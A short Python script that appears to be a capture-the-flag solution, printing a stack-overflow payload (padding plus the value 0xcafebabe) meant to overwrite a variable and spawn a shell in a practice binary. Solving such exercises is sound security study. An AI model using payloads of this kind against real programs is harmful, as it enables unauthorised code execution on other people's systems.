#!/usr/bin/env python

from __future__ import print_function
import struct
from functools import partial


pr = partial(print, end='')


p32 = partial(struct.pack, "<I")


def splt():
    return p32(0xcafebabe) * 0x10   # my solution
    # return p32(0xcafebabe) * 0x100    # TO-DO: check what went wrong on the stack to not spawn a shell
    # return "a" * 52 + p32(0xcafebabe)    # From youtube solution


def main():
    pr(splt())


if __name__ == '__main__':
    main()
